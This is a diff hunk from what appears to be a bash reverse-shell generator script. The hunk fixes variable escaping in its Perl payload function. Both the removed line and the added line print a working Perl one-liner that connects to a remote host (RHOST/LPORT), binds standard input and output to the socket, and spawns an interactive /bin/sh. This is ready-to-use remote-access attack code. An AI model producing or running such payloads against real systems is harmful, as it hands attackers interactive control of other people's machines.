@@ -34,7 +34,7 @@ function bash() {
 function perl() {
     printf "\n\t${RED}##########${NC}PERL SHELL(S)${RED}##########${NC}\n\n"
 
-    printf "perl -e 'use Socket;$i=\"\${RHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    printf "perl -e 'use Socket;$i=\"${RHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
 
     printf "\n\n"
 
